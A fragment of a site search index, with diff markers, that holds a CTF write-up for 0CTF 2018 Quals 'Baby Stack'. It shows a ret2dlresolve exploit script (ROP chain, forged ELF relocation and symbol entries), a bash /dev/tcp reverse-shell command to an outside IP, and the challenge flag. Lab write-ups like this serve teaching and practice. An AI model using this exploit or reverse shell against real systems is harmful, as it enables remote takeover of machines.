\n=\n \n0x8048300\n\n\n\nbuf\n \n=\n \n0x804a500\n\n\n\nrop\n \n=\n \nflat\n(\n\n        \n# _dl_runtime_resolve call and reloc_arg\n\n        \nplt0\n,\n \nbuf\n \n-\n \nrelplt\n,\n \n# will resolve system\n\n        \n0xdeadbeef\n,\n \n# return address\n\n        \nbuf\n \n+\n \n36\n \n# parameter \"/bin/sh\"\n\n        \n)\n\n\n\ndata\n \n=\n \nflat\n(\n\n        \n# Elf32_Rel\n\n        \nbuf\n,\n \n0x7\n \n|\n \n((\nbuf\n \n+\n \n12\n \n-\n \ndynsym\n)\n \n/\n \n16\n)\n \n<<\n \n8\n,\n \n0xdeadbeef\n,\n \n# 0xdeadbeef is padding\n\n        \n# Elf32_Sym\n\n        \nbuf\n \n+\n \n28\n \n-\n \ndynstr\n,\n \n0\n,\n \n0\n,\n \n0x12\n,\n\n        \n'system\n\\x00\\x00\n'\n,\n\n        \n'/bin/sh\n\\x00\n'\n\n        \n)\n\n\n\nverify\n()\n\n\n\n# read data to buf\n\n\nsend\n(\n'a'\n \n*\n \n44\n \n+\n \nflat\n(\nread_plt\n,\n \nmain\n,\n \n0\n,\n \nbuf\n,\n \n44\n),\n \n0x40\n)\n\n\nsend\n(\ndata\n,\n \n44\n)\n\n\n\n# use ret2dlresolve to call system(\"/bin/sh\")\n\n\nsend\n(\n'a'\n \n*\n \n44\n \n+\n \nrop\n,\n \n0x40\n)\n\n\n\n# make a reverse shell\n\n\nsend\n(\n'bash -c \"bash -i &>/dev/tcp/35.201.141.84/80 0>&1\"'\n,\n \n0x100\n)\n\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\nflag{return_to_dlresolve_for_warming_up}\n\n\nNote\n\n\nhttps://www.slideshare.net/AngelBoy1/re2dlresolve\n\n\nhttps://www.youtube.com/watch?v=wsIvqd9YqTI",
-            "title": "0CTF 2018 Quals Baby Stack"
+            "title": "0CTF-2018-Quals:Baby-Stack"
         },
         {
             "location": "/writeup/0CTF-2018-Quals:Baby-Stack/#0ctf-2018-quals-baby-stack",
